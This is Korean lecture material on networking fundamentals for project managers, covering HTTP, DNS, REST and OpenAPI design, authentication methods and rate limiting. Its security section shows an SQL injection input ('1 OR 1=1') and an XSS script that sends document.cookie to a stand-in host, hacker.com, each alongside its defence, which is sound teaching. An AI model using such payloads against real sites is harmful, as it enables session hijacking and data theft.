# Week 16: 네트워크 기초 상세 강의 자료

## 📚 학습 목표 (상세)
1. **네트워크 기본 개념** 이해 (IP, DNS, HTTP/HTTPS)
2. **PM이 알아야 할 네트워크 용어** 30개 습득
3. **API 및 REST** 기초 이해
4. **네트워크 보안** 기초 (HTTPS, 인증, 인가)
5. **웹 아키텍처** 이해 (클라이언트-서버, CDN)
6. **네트워크 성능** 최적화 기본

---

## 🌐 Part 1: 네트워크 기초

### 1.1 인터넷은 어떻게 작동하는가?

#### 비유로 이해하기

**우편 시스템과 인터넷**:
```
우편:
- 주소: 서울시 강남구 xxx
- 우체국: 라우터
- 우편물: 데이터 패킷

인터넷:
- IP 주소: 192.168.0.1
- 라우터: 데이터 전송 장치
- 패킷: 작은 데이터 조각
```

#### 웹페이지가 로드되는 과정

```
1. 주소 입력
   사용자: www.example.com 입력
   
2. DNS 조회
   DNS 서버: "example.com = 93.184.216.34"
   
3. 서버 연결
   브라우저 → 서버 IP로 연결 요청
   
4. 데이터 요청
   브라우저: "index.html 주세요"
   
5. 데이터 수신
   서버 → HTML, CSS, JS 전송
   
6. 화면 렌더링
   브라우저: 페이지 표시
```

**시간**:
```
총 소요 시간: 약 100-500ms
- DNS 조회: 20-120ms
- 연결: 20-100ms
- 데이터 전송: 50-200ms
- 렌더링: 10-80ms
```

### 1.2 핵심 프로토콜

#### HTTP (HyperText Transfer Protocol)

**요청-응답 모델**:
```
클라이언트 → 서버
GET /index.html HTTP/1.1
Host: www.example.com

서버 → 클라이언트
HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html>
```

**HTTP 메서드**:
```
GET: 데이터 조회
POST: 데이터 생성
PUT: 데이터 수정 (전체)
PATCH: 데이터 수정 (일부)
DELETE: 데이터 삭제
```

**HTTP 상태 코드**:
```
2xx (성공)
- 200 OK: 성공
- 201 Created: 생성 성공

3xx (리다이렉트)
- 301 Moved Permanently: 영구 이동
- 302 Found: 임시 이동

4xx (클라이언트 오류)
- 400 Bad Request: 잘못된 요청
- 401 Unauthorized: 인증 필요
- 403 Forbidden: 권한 없음
- 404 Not Found: 찾을 수 없음

5xx (서버 오류)
- 500 Internal Server Error: 서버 오류
- 503 Service Unavailable: 서비스 불가
```

#### HTTPS (HTTP Secure)

**HTTP vs HTTPS**:
```
HTTP:
❌ 평문 전송 (누구나 볼 수 있음)
❌ 중간자 공격 가능
❌ 데이터 변조 가능

HTTPS:
✅ 암호화 전송
✅ 서버 인증
✅ 데이터 무결성
```

**SSL/TLS 인증서**:
```
역할:
1. 암호화
2. 서버 신원 확인
3. 데이터 무결성

발급:
- Let's Encrypt (무료)
- Comodo, DigiCert (유료)

주의:
- 만료 전 갱신 필요
- 모든 페이지에 HTTPS 적용
```

### 1.3 IP 주소와 DNS

#### IP 주소

**IPv4**:
```
형식: 192.168.0.1
- 4개 숫자 (0-255)
- 점(.)으로 구분
- 약 43억 개 주소
```

**IPv6**:
```
형식: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
- 16진수
- 콜론(:)으로 구분
- 거의 무한대 주소
```

**사설 IP vs 공인 IP**:
```
사설 IP:
- 192.168.x.x
- 10.x.x.x
- 내부 네트워크 전용

공인 IP:
- 인터넷에서 접근 가능
- 전세계 고유
- ISP가 할당
```

#### DNS (Domain Name System)

**도메인 구조**:
```
www.example.com

com: TLD (Top-Level Domain)
example: 2nd Level Domain
www: Subdomain
```

**DNS 레코드 타입**:
```
A 레코드: 도메인 → IPv4
AAAA 레코드: 도메인 → IPv6
CNAME: 별칭
MX: 메일 서버
TXT: 텍스트 정보 (SPF, DKIM)
```

---

## 🔌 Part 2: API 기초

### 2.1 API란?

**정의**: Application Programming Interface

**비유**:
```
식당에서:
- 손님: 클라이언트
- 웨이터: API
- 주방: 서버

손님이 직접 주방에 가지 않고
웨이터(API)를 통해 주문
```

**API의 역할**:
```
✅ 프로그램 간 통신
✅ 데이터 교환
✅ 기능 공유
✅ 통합 간소화
```

### 2.2 REST API

#### REST (REpresentational State Transfer)

**원칙**:
```
1. 자원(Resource): URL로 표현
2. 동작(Verb): HTTP 메서드
3. 표현(Representation): JSON, XML

예:
GET /users/123
→ 123번 사용자 정보 조회
```

#### REST API 설계

**좋은 예**:
```
GET    /users          모든 사용자 조회
GET    /users/123      123번 사용자 조회
POST   /users          사용자 생성
PUT    /users/123      123번 사용자 수정
DELETE /users/123      123번 사용자 삭제

GET    /users/123/orders  123번 사용자의 주문 목록
```

**나쁜 예**:
```
GET    /getUsers
POST   /createUser
GET    /deleteUser?id=123  ← 삭제에 GET 사용
POST   /users/123/delete   ← URL에 동사
```

#### API 요청/응답 예시

**요청**:
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer abc123token

{
  "name": "김철수",
  "email": "kim@example.com",
  "age": 30
}
```

**응답**:
```http
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 456,
  "name": "김철수",
  "email": "kim@example.com",
  "age": 30,
  "created_at": "2024-01-15T10:30:00Z"
}
```

### 2.3 GraphQL

**REST vs GraphQL**:
```
REST:
GET /users/123
GET /users/123/posts
GET /users/123/friends
→ 3번 요청

GraphQL:
query {
  user(id: 123) {
    name
    posts { title }
    friends { name }
  }
}
→ 1번 요청
```

**장단점**:
```
GraphQL 장점:
✅ 필요한 데이터만 요청
✅ 단일 요청으로 다중 리소스
✅ 강력한 타입 시스템

GraphQL 단점:
❌ 학습 곡선
❌ 캐싱 복잡
❌ 파일 업로드 어려움
```

### 2.4 API 문서화

**Swagger/OpenAPI 예시**:
```yaml
paths:
  /users:
    get:
      summary: Get all users
      responses:
        200:
          description: Success
          schema:
            type: array
            items:
              $ref: '#/definitions/User'
              
definitions:
  User:
    type: object
    properties:
      id:
        type: integer
      name:
        type: string
      email:
        type: string
```

---

## 🔐 Part 3: 네트워크 보안

### 3.1 인증 vs 인가

**인증 (Authentication)**:
```
질문: "당신은 누구인가?"
방법: 로그인 (아이디 + 비밀번호)
예: "나는 김철수입니다"
```

**인가 (Authorization)**:
```
질문: "무엇을 할 수 있는가?"
방법: 권한 확인
예: "김철수는 관리자 페이지 접근 가능"
```

### 3.2 인증 방법

#### 세션 기반

```
1. 로그인
   클라이언트 → 서버
   POST /login {username, password}

2. 세션 생성
   서버: 세션 ID 생성 및 저장
   
3. 쿠키 전송
   서버 → 클라이언트
   Set-Cookie: sessionId=abc123
   
4. 이후 요청
   클라이언트 → 서버
   Cookie: sessionId=abc123
   
5. 세션 검증
   서버: 세션 ID로 사용자 확인
```

**장단점**:
```
장점:
✅ 서버에서 제어 가능
✅ 로그아웃 즉시 반영

단점:
❌ 서버 부하 (세션 저장)
❌ 확장성 제한
```

#### 토큰 기반 (JWT)

**JWT (JSON Web Token)**:
```
구조:
Header.Payload.Signature

예:
eyJhbGci.eyJ1c2Vy.SflKxwRJ

Payload 내용:
{
  "userId": 123,
  "name": "김철수",
  "exp": 1640000000
}
```

**흐름**:
```
1. 로그인
   클라이언트 → 서버
   
2. 토큰 발급
   서버 → 클라이언트
   JWT 토큰 생성 및 전송
   
3. 이후 요청
   클라이언트 → 서버
   Authorization: Bearer <token>
   
4. 토큰 검증
   서버: 서명 검증
```

**장단점**:
```
장점:
✅ 서버 부하 낮음
✅ 확장성 좋음
✅ 모바일 친화적

단점:
❌ 토큰 탈취 위험
❌ 로그아웃 즉시 반영 어려움
```

### 3.3 보안 위협

#### HTTPS 필수

**중간자 공격 (MITM)**:
```
HTTP:
사용자 → [해커] → 서버
         ↑
      데이터 탈취

HTTPS:
사용자 → [해커] → 서버
      (암호화된 데이터)
```

#### SQL Injection

**취약한 코드**:
```sql
query = "SELECT * FROM users WHERE id = " + userId;

공격:
userId = "1 OR 1=1"
결과: 모든 사용자 정보 유출
```

**안전한 코드**:
```sql
query = "SELECT * FROM users WHERE id = ?"
params = [userId]
```

#### XSS (Cross-Site Scripting)

**공격**:
```html
댓글 입력:
<script>
  // 쿠키 탈취
  fetch('http://hacker.com?cookie=' + document.cookie)
</script>
```

**방어**:
```javascript
// 입력 검증 및 이스케이프
const sanitized = escapeHtml(userInput);
```

---

## 📊 Part 4: 성능 최적화

### 4.1 레이턴시와 처리량

**레이턴시 (Latency)**:
```
정의: 요청부터 응답까지 시간
단위: ms (밀리초)

목표:
- 웹: < 200ms
- API: < 100ms
- 실시간: < 50ms
```

**처리량 (Throughput)**:
```
정의: 단위 시간당 처리량
단위: req/s (초당 요청 수)

목표:
- 소규모: 100 req/s
- 중규모: 1,000 req/s
- 대규모: 10,000+ req/s
```

### 4.2 CDN (Content Delivery Network)

**CDN 없이**:
```
한국 사용자 → 미국 서버
왕복 시간: 200ms
```

**CDN 사용**:
```
한국 사용자 → 한국 CDN
왕복 시간: 20ms
→ 10배 빠름!
```

**동작 원리**:
```
1. 사용자 요청
2. 가장 가까운 CDN 서버
3. 캐시 확인
   - 있으면: 즉시 응답
   - 없으면: 원본 서버에서 가져와 캐시
```

### 4.3 로드 밸런서

**역할**:
```
사용자 요청
     ↓
┌─────────────┐
│Load Balancer│
└─────────────┘
   /    |    \
  /     |     \
서버1  서버2  서버3
```

**알고리즘**:
```
Round Robin: 순서대로 분산
Least Connections: 연결 적은 서버
IP Hash: IP 기반 할당
```

---

## 📋 Part 5: PM이 알아야 할 네트워크 용어 30개

| 용어 | 설명 | PM 관점 |
|-----|------|---------|
| **IP** | 인터넷 주소 | 서버 식별 |
| **DNS** | 도메인 이름 시스템 | 도메인 관리 |
| **HTTP/HTTPS** | 웹 프로토콜 | 보안 필수 |
| **API** | 프로그램 간 통신 | 통합 핵심 |
| **REST** | API 설계 방식 | 표준 규약 |
| **JSON** | 데이터 형식 | API 응답 |
| **SSL/TLS** | 암호화 프로토콜 | 보안 인증서 |
| **쿠키** | 브라우저 저장 데이터 | 세션 유지 |
| **세션** | 로그인 상태 유지 | 인증 관리 |
| **토큰** | 인증 정보 | JWT 활용 |
| **방화벽** | 네트워크 보안 | 접근 통제 |
| **VPN** | 가상 사설망 | 원격 접속 |
| **CDN** | 콘텐츠 전송 네트워크 | 성능 향상 |
| **로드 밸런서** | 트래픽 분산 | 고가용성 |
| **대역폭** | 전송 용량 | 비용 관리 |
| **레이턴시** | 응답 시간 | 사용자 경험 |
| **처리량** | 초당 요청 수 | 용량 계획 |
| **패킷** | 데이터 단위 | 전송 이해 |
| **포트** | 서비스 구분 | 80, 443 |
| **프록시** | 중계 서버 | 보안, 캐싱 |
| **캐시** | 임시 저장 | 성능 개선 |
| **WebSocket** | 양방향 통신 | 실시간 기능 |
| **OAuth** | 인증 프로토콜 | SNS 로그인 |
| **CORS** | 교차 출처 요청 | API 보안 |
| **Webhook** | 이벤트 알림 | 자동화 |
| **NAT** | 주소 변환 | 사설 IP |
| **Subnet** | 네트워크 분할 | 보안 구분 |
| **Gateway** | 네트워크 출입구 | 라우팅 |
| **Ping** | 연결 확인 | 장애 진단 |
| **Traceroute** | 경로 추적 | 네트워크 분석 |

---

## 💼 6. 실습 과제

### 과제 1: API 테스트

**도구**: Postman 또는 curl

**과제**:
1. 공개 API 선택 (예: JSONPlaceholder)
2. 5개 요청 실행:
   - GET: 목록 조회
   - GET: 단일 항목
   - POST: 생성
   - PUT: 수정
   - DELETE: 삭제
3. 응답 분석

**제출물**:
- 요청/응답 스크린샷
- 상태 코드 정리

### 과제 2: 네트워크 진단

**도구**: 
- ping
- traceroute
- nslookup

**과제**:
1. 3개 웹사이트 진단
2. 응답 시간 비교
3. 경로 분석

**제출물**:
- 진단 결과 정리 (1페이지)

### 과제 3: API 설계

**시나리오**: 블로그 시스템

**요구사항**:
- 게시물 CRUD
- 댓글 기능
- 사용자 인증

**과제**:
REST API 엔드포인트 설계

**제출물**:
- API 명세서 (2페이지)

---

## 🎯 7. 자가 점검 퀴즈

### 객관식

**1. HTTP 상태 코드 404의 의미는?**
- A) 성공
- B) 서버 오류
- C) 찾을 수 없음
- D) 권한 없음

**정답**: C

---

**2. REST API에서 데이터 생성 시 사용하는 HTTP 메서드는?**
- A) GET
- B) POST
- C) PUT
- D) DELETE

**정답**: B

---

**3. JWT의 구성 요소가 아닌 것은?**
- A) Header
- B) Payload
- C) Session
- D) Signature

**정답**: C

---

**4. CDN의 주요 목적은?**
- A) 보안 강화
- B) 성능 향상
- C) 비용 절감
- D) 개발 효율

**정답**: B

---

**5. 인증(Authentication)과 인가(Authorization)의 차이는?**
- A) 같은 의미
- B) 인증은 신원 확인, 인가는 권한 확인
- C) 인가가 먼저
- D) 차이 없음

**정답**: B

---

### 서술형

**6. HTTP와 HTTPS의 차이를 보안 관점에서 설명하시오.**

**모범 답안**:
- **HTTP**: 평문 전송, 중간자 공격 취약
- **HTTPS**: SSL/TLS 암호화, 데이터 보호, 서버 인증

---

**7. REST API 설계 원칙 5가지를 나열하시오.**

**모범 답안**:
1. 자원은 명사로 표현
2. HTTP 메서드 활용 (GET, POST, PUT, DELETE)
3. 계층 구조 표현
4. 복수형 사용
5. 버전 관리

---

**8. 세션 기반 인증과 토큰 기반 인증의 장단점을 비교하시오.**

**모범 답안**:

**세션**:
- 장점: 서버 제어, 즉시 로그아웃
- 단점: 서버 부하, 확장성 제한

**토큰**:
- 장점: 서버 부하 낮음, 확장성
- 단점: 탈취 위험, 로그아웃 처리 어려움

---

**9. PM이 API 명세서를 검토할 때 확인해야 할 5가지 항목을 나열하시오.**

**모범 답안**:
1. 엔드포인트 명명 규칙
2. HTTP 메서드 적절성
3. 요청/응답 형식
4. 에러 처리
5. 인증/인가 방식

---

**10. 네트워크 성능 최적화 방법 5가지를 설명하시오.**

**모범 답안**:
1. **CDN 활용**: 지리적 근접성
2. **캐싱**: 반복 요청 감소
3. **압축**: gzip, Brotli
4. **로드 밸런싱**: 트래픽 분산
5. **HTTP/2**: 멀티플렉싱

---

## 📚 8. 핵심 용어 정리

| 한글 | 영문 | 설명 |
|-----|------|------|
| 프로토콜 | Protocol | 통신 규약 |
| 대역폭 | Bandwidth | 전송 용량 |
| 레이턴시 | Latency | 응답 시간 |
| 처리량 | Throughput | 초당 요청 |
| 패킷 | Packet | 데이터 단위 |
| 라우터 | Router | 경로 결정 장치 |
| 방화벽 | Firewall | 보안 장치 |
| 프록시 | Proxy | 중계 서버 |

---

## 🎓 과정 완료

**축하합니다!**

Week 1-16 모든 과정을 완료하셨습니다.

**다음 단계**:
1. 모의 프로젝트 복습
2. 실습 과제 완성
3. PM 자격증 준비 (PMP, CAPM)

---

**강의 자료 버전**: 1.0  
**최종 업데이트**: 2026년 1월  
**작성자**: PM Expert Training Team

---

## 🌐 Part 7: REST API 설계 (고급)

### 7.1 RESTful API 원칙

#### REST란?
**REST (Representational State Transfer)**: 웹 서비스 설계 아키텍처 스타일

**6가지 핵심 원칙**:

**1. Client-Server 분리**
```
[클라이언트]          [서버]
- UI/UX              - 비즈니스 로직
- 사용자 경험         - 데이터 저장
- 프레젠테이션        - 보안

장점: 독립적 개발 및 확장 가능
```

**2. Stateless (무상태)**
```
❌ Stateful (세션 사용):
Request 1: 로그인
Server: 세션에 저장
Request 2: 데이터 요청 (세션 ID 필요)

✅ Stateless:
Request 1: 로그인 → 토큰 반환
Request 2: 데이터 요청 + 토큰

장점: 
- 서버 확장 쉬움
- 장애 복구 간단
```

**3. Cacheable (캐시 가능)**
```
GET /users/123
Cache-Control: max-age=3600

→ 1시간 동안 캐시 사용
→ 서버 부하 감소
```

**4. Uniform Interface (일관된 인터페이스)**
```
✅ 좋은 예:
GET    /users          (모든 사용자 조회)
GET    /users/123      (특정 사용자 조회)
POST   /users          (사용자 생성)
PUT    /users/123      (사용자 전체 수정)
PATCH  /users/123      (사용자 부분 수정)
DELETE /users/123      (사용자 삭제)

❌ 나쁜 예:
POST   /getUsers
POST   /createUser
POST   /updateUser
POST   /deleteUser
```

**5. Layered System (계층화)**
```
[클라이언트]
     ↓
[로드 밸런서]
     ↓
[API Gateway]
     ↓
[인증 서버]
     ↓
[애플리케이션 서버]
     ↓
[데이터베이스]

각 계층이 독립적으로 작동
```

**6. Code on Demand (선택)**
- 서버가 클라이언트에 실행 가능한 코드 전송 (예: JavaScript)

### 7.2 RESTful URL 설계

#### 리소스 중심 설계

**✅ 좋은 URL**:
```
GET    /api/v1/projects                    (프로젝트 목록)
GET    /api/v1/projects/123                (프로젝트 상세)
GET    /api/v1/projects/123/tasks          (프로젝트의 작업 목록)
POST   /api/v1/projects/123/tasks          (작업 생성)
GET    /api/v1/users/456/projects          (사용자의 프로젝트)

규칙:
- 명사 사용 (동사 X)
- 복수형 사용
- 계층 구조 명확
- 소문자 사용
- 하이픈(-) 사용, 언더스코어(_) 지양
```

**❌ 나쁜 URL**:
```
/api/getProject?id=123           (동사 사용)
/api/projects/delete/123         (동사 포함)
/api/Project/123                 (대문자)
/api/projects_list               (언더스코어)
/api/getUserProjectList          (너무 김, 동사)
```

#### HTTP 메서드 사용

| 메서드 | 용도 | 예시 | Idempotent* |
|--------|------|------|-------------|
| GET | 조회 | GET /users/123 | ✅ Yes |
| POST | 생성 | POST /users | ❌ No |
| PUT | 전체 수정 | PUT /users/123 | ✅ Yes |
| PATCH | 부분 수정 | PATCH /users/123 | ❌ No |
| DELETE | 삭제 | DELETE /users/123 | ✅ Yes |

*Idempotent: 여러 번 실행해도 결과가 동일

#### 필터링, 정렬, 페이지네이션

```
필터링:
GET /projects?status=active
GET /projects?status=active&priority=high

정렬:
GET /projects?sort=created_date
GET /projects?sort=-created_date  (내림차순)

페이지네이션:
GET /projects?page=1&limit=20
GET /projects?offset=0&limit=20

조합:
GET /projects?status=active&sort=-created_date&page=1&limit=20
```

#### 검색
```
방법 1: 쿼리 파라미터
GET /projects?q=website+redesign

방법 2: 전용 엔드포인트
GET /search?type=projects&q=website

방법 3: POST로 복잡한 검색
POST /projects/search
Body: {
  "status": ["active", "pending"],
  "priority": "high",
  "date_range": {
    "start": "2026-01-01",
    "end": "2026-12-31"
  }
}
```

### 7.3 HTTP 상태 코드

#### 주요 상태 코드

**2xx (성공)**:
```
200 OK                   - 요청 성공
201 Created              - 리소스 생성됨
204 No Content           - 성공했지만 반환 데이터 없음
```

**3xx (리다이렉션)**:
```
301 Moved Permanently    - 영구 이동
302 Found               - 임시 이동
304 Not Modified        - 캐시 사용 가능
```

**4xx (클라이언트 오류)**:
```
400 Bad Request         - 잘못된 요청
401 Unauthorized        - 인증 필요
403 Forbidden          - 권한 없음
404 Not Found          - 리소스 없음
409 Conflict           - 충돌 (중복 등)
422 Unprocessable Entity - 유효성 검증 실패
429 Too Many Requests  - 요청 과다
```

**5xx (서버 오류)**:
```
500 Internal Server Error - 서버 내부 오류
502 Bad Gateway          - 게이트웨이 오류
503 Service Unavailable  - 서비스 이용 불가
504 Gateway Timeout      - 게이트웨이 타임아웃
```

#### 에러 응답 표준 형식

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "입력 데이터 검증에 실패했습니다",
    "details": [
      {
        "field": "email",
        "message": "유효한 이메일 주소가 아닙니다"
      },
      {
        "field": "password",
        "message": "비밀번호는 최소 8자 이상이어야 합니다"
      }
    ],
    "request_id": "req-abc-123"
  }
}
```

### 7.4 API 버전 관리

#### 왜 버전 관리가 필요한가?

```
문제 상황:
v1: GET /users → { "name": "홍길동" }
v2: GET /users → { "first_name": "길동", "last_name": "홍" }

v1 사용 중인 클라이언트가 있는데 v2로 변경하면?
→ 기존 클라이언트 앱이 고장남 💥
```

#### 버전 관리 방법

**방법 1: URL 경로 (권장)**
```
https://api.example.com/v1/users
https://api.example.com/v2/users

장점: 
- 명확하고 직관적
- 캐싱 쉬움
- 브라우저에서 테스트 용이

단점:
- URL 변경 필요
```

**방법 2: 헤더**
```
GET /users
Accept: application/vnd.example.v1+json

장점:
- URL 깔끔
- RESTful 원칙 준수

단점:
- 브라우저 테스트 어려움
- 캐싱 복잡
```

**방법 3: 쿼리 파라미터**
```
GET /users?version=1

단점:
- 권장하지 않음
- 캐싱 복잡
```

#### 버전 관리 전략

**1. 하위 호환성 유지 (Breaking Changes 최소화)**
```
✅ 안전한 변경:
- 새 필드 추가
- 새 엔드포인트 추가
- 선택적 파라미터 추가

❌ Breaking Changes:
- 기존 필드 제거
- 필드 타입 변경
- 필수 파라미터 추가
- 엔드포인트 URL 변경
```

**2. 지원 정책 명확히**
```
v1: 2024.01 출시 → 2026.12 종료 예정
v2: 2025.06 출시 → 2027.12 종료 예정 (현재)
v3: 2026.01 출시 → 활성 (최신)

정책:
- 최소 2년 지원
- 종료 6개월 전 공지
- 마이그레이션 가이드 제공
```

**3. Deprecation (사용 중단) 알림**
```
응답 헤더:
Deprecated: true
Sunset: Sat, 31 Dec 2026 23:59:59 GMT
Link: <https://api.example.com/v2/users>; rel="alternate"

본문:
{
  "data": { ... },
  "meta": {
    "deprecated": true,
    "message": "이 버전은 2026년 12월 31일에 종료됩니다",
    "migration_guide": "https://docs.example.com/migration-v1-to-v2"
  }
}
```

### 7.5 PM이 검토해야 할 API 설계

#### API 설계 체크리스트

**일관성**:
- [ ] 모든 엔드포인트가 RESTful 원칙을 따르는가?
- [ ] 명명 규칙이 일관적인가?
- [ ] 에러 응답 형식이 통일되어 있는가?

**보안**:
- [ ] HTTPS만 사용하는가?
- [ ] 인증 메커니즘이 있는가?
- [ ] 권한 관리가 적절한가?
- [ ] Rate Limiting이 설정되어 있는가?

**성능**:
- [ ] 페이지네이션이 구현되어 있는가?
- [ ] 캐싱 전략이 있는가?
- [ ] 응답 크기가 적절한가?

**문서화**:
- [ ] API 문서가 최신인가?
- [ ] 예제가 충분한가?
- [ ] 에러 코드가 문서화되어 있는가?

**모니터링**:
- [ ] 로깅이 되고 있는가?
- [ ] 에러 추적 시스템이 있는가?
- [ ] 성능 모니터링이 되는가?

---

## 📝 Part 8: API 문서화 (Swagger/OpenAPI)

### 8.1 API 문서화의 중요성

#### 왜 문서화가 필요한가?

**문서화 없을 때**:
```
개발자 A: "이 API 어떻게 써요?"
개발자 B: "음... 코드 보면서 설명할게요"
→ 30분 소요, 비효율적

개발자 B 퇴사 후:
개발자 C: "이 API 어떻게 써요?"
→ 코드 분석 2시간 소요 💀
```

**문서화 있을 때**:
```
개발자 A: Swagger UI 보고 5분 만에 이해
개발자 C: 개발자 B 퇴사 후에도 문서만 보고 사용
→ 효율적!
```

### 8.2 OpenAPI Specification (Swagger)

#### OpenAPI란?
- REST API를 설명하는 표준 규격
- 기계가 읽을 수 있는 형식 (YAML/JSON)
- Swagger UI로 시각화 가능

#### 기본 예제

```yaml
openapi: 3.0.0
info:
  title: PM Expert Project API
  version: 1.0.0
  description: 프로젝트 관리 API

servers:
  - url: https://api.pmexpert.com/v1
    description: 프로덕션 서버
  - url: https://api-dev.pmexpert.com/v1
    description: 개발 서버

paths:
  /projects:
    get:
      summary: 프로젝트 목록 조회
      description: 모든 프로젝트를 조회합니다
      parameters:
        - name: status
          in: query
          description: 프로젝트 상태 필터
          schema:
            type: string
            enum: [active, pending, completed]
        - name: page
          in: query
          description: 페이지 번호
          schema:
            type: integer
            default: 1
      responses:
        '200':
          description: 성공
          content:
            application/json:
              schema:
                type: object
                properties:
                  data:
                    type: array
                    items:
                      $ref: '#/components/schemas/Project'
                  meta:
                    type: object
                    properties:
                      total: 
                        type: integer
                      page:
                        type: integer
        '401':
          description: 인증 실패
          
    post:
      summary: 프로젝트 생성
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/ProjectInput'
      responses:
        '201':
          description: 생성 성공
        '400':
          description: 잘못된 요청

components:
  schemas:
    Project:
      type: object
      properties:
        id:
          type: string
        name:
          type: string
        status:
          type: string
        created_at:
          type: string
          format: date-time
          
    ProjectInput:
      type: object
      required:
        - name
      properties:
        name:
          type: string
        description:
          type: string
```

#### Swagger UI 예제

문서 URL: `https://api.pmexpert.com/docs`

**Swagger UI 기능**:
- 📖 모든 엔드포인트 목록
- 🧪 "Try it out" 버튼으로 실제 API 테스트
- 📊 요청/응답 예제
- 🔐 인증 테스트
- 📥 자동으로 코드 스니펫 생성

### 8.3 PM이 확인할 사항

**문서 완성도**:
- [ ] 모든 엔드포인트가 문서화되었는가?
- [ ] 요청 예제가 있는가?
- [ ] 응답 예제가 있는가?
- [ ] 에러 케이스가 문서화되었는가?

**개발자 경험**:
- [ ] 문서가 최신인가?
- [ ] Try it out 기능이 작동하는가?
- [ ] 인증 방법이 명확한가?
- [ ] 코드 예제가 충분한가?

**유지보수**:
- [ ] 코드 변경 시 문서도 자동 업데이트되는가?
- [ ] 버전별 문서가 분리되어 있는가?

---

## 🔒 Part 9: API 인증 및 보안 (고급)

### 9.1 인증 vs 인가

```
인증 (Authentication): "당신이 누구인지?"
예: 로그인 (아이디/비밀번호)

인가 (Authorization): "무엇을 할 수 있는지?"
예: 관리자만 사용자 삭제 가능
```

### 9.2 인증 방법

#### 1. API Key

**사용 방법**:
```
GET /api/projects
X-API-Key: sk_live_abc123def456
```

**장점**:
- ✅ 구현 간단
- ✅ 사용하기 쉬움

**단점**:
- ❌ 만료 없음 (탈취 시 위험)
- ❌ 사용자 식별 어려움
- ❌ 권한 관리 제한적

**적합한 경우**:
- 서버 간 통신
- 내부 API
- 간단한 서비스

#### 2. OAuth 2.0

**개념**:
제3자 서비스에 비밀번호 없이 권한 부여

**예시**: "Google로 로그인"
```
1. 사용자가 "Google로 로그인" 클릭
2. Google 로그인 페이지로 리다이렉트
3. 사용자가 Google에 로그인
4. Google이 권한 요청 (이메일, 프로필)
5. 사용자가 승인
6. Google이 Access Token 발급
7. 앱이 Token으로 Google API 접근
```

**장점**:
- ✅ 비밀번호 노출 없음
- ✅ 권한 범위 제한 가능
- ✅ Token 만료 가능

**단점**:
- ❌ 구현 복잡
- ❌ 여러 당사자 관여

**적합한 경우**:
- 소셜 로그인
- 제3자 앱 통합
- 모바일 앱

#### 3. JWT (JSON Web Token)

**구조**:
```
Header.Payload.Signature

예:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjoxMjMsImV4cCI6MTY3Nzg4ODAwMH0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Payload (디코딩 시)**:
```json
{
  "user_id": 123,
  "email": "user@example.com",
  "role": "admin",
  "exp": 1677888000
}
```

**사용 방법**:
```
POST /api/login
Body: { "email": "...", "password": "..." }
Response: { "token": "eyJ..." }

GET /api/projects
Authorization: Bearer eyJ...
```

**장점**:
- ✅ Stateless (서버에 세션 저장 불필요)
- ✅ 확장성 좋음
- ✅ 여러 서비스에서 사용 가능

**단점**:
- ❌ Token 크기가 큼
- ❌ 탈취 시 만료까지 유효 (해결: Refresh Token)

**Best Practice**:
```
Access Token: 15분 만료
Refresh Token: 7일 만료

Access Token 만료 시:
→ Refresh Token으로 새 Access Token 발급
→ Refresh Token도 갱신

Refresh Token 만료 시:
→ 재로그인 필요
```

### 9.3 Rate Limiting (속도 제한)

#### 왜 필요한가?

```
공격 시나리오:
악의적 사용자가 1초에 1000번 API 호출
→ 서버 과부하 💥
→ 정상 사용자도 접근 불가

Rate Limiting 적용:
동일 사용자: 분당 100 요청
→ 초과 시 429 Too Many Requests
→ 서버 보호, 공격 차단 ✅
```

#### 구현 방법

**1. IP 기반**
```
IP 주소당 분당 100 요청
문제: 공용 IP 사용자 제한
```

**2. API Key/Token 기반**
```
사용자당 분당 100 요청
더 정확한 제한
```

**3. 계층별 제한**
```
무료: 분당 10 요청
기본: 분당 100 요청
프로: 분당 1,000 요청
엔터프라이즈: 무제한
```

#### 응답 헤더

```
HTTP/1.1 429 Too Many Requests
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1677888060
Retry-After: 60

Body:
{
  "error": {
    "code": "RATE_LIMIT_EXCEEDED",
    "message": "분당 요청 한도를 초과했습니다",
    "retry_after": 60
  }
}
```

### 9.4 보안 체크리스트

#### PM이 확인해야 할 보안 사항

**전송 보안**:
- [ ] HTTPS만 사용하는가?
- [ ] TLS 1.2 이상 사용하는가?
- [ ] HTTP는 HTTPS로 리다이렉트하는가?

**인증/인가**:
- [ ] 모든 민감한 엔드포인트에 인증이 필요한가?
- [ ] 권한 체크가 제대로 되는가?
- [ ] Token 만료 시간이 적절한가? (너무 길지 않은가?)

**입력 검증**:
- [ ] SQL Injection 방어하는가?
- [ ] XSS 공격 방어하는가?
- [ ] 입력 크기 제한이 있는가?

**Rate Limiting**:
- [ ] 속도 제한이 설정되어 있는가?
- [ ] 로그인 시도 제한이 있는가? (Brute Force 방지)

**로깅/모니터링**:
- [ ] 보안 관련 이벤트를 로깅하는가?
- [ ] 비정상 활동 감지하는가?
- [ ] 알림 시스템이 있는가?

**데이터 보호**:
- [ ] 민감 데이터가 암호화되는가?
- [ ] 비밀번호가 해시되는가? (평문 저장 금지!)
- [ ] 개인정보 보호 정책을 준수하는가?

---

## 🎯 Part 10: 실전 PM 가이드

### 10.1 API 프로젝트 시작할 때

**1주차: 계획 수립**
- [ ] API 사용자 정의 (Web/Mobile/3rd party)
- [ ] 주요 기능 목록
- [ ] 우선순위 설정
- [ ] 보안 요구사항 파악
- [ ] 예상 트래픽 추정

**2주차: 설계**
- [ ] URL 구조 설계
- [ ] 데이터 모델 설계
- [ ] 에러 코드 정의
- [ ] 버전 관리 전략
- [ ] 인증 방식 결정

**3주차: 문서화**
- [ ] OpenAPI 스펙 작성
- [ ] 예제 작성
- [ ] Swagger UI 설정
- [ ] 개발자 가이드 작성

**4주차 이후: 개발**
- [ ] 핵심 엔드포인트 먼저
- [ ] 단위 테스트
- [ ] 통합 테스트
- [ ] 성능 테스트

### 10.2 API 품질 체크리스트

**기능**:
- [ ] 모든 요구사항을 충족하는가?
- [ ] 엣지 케이스가 처리되는가?
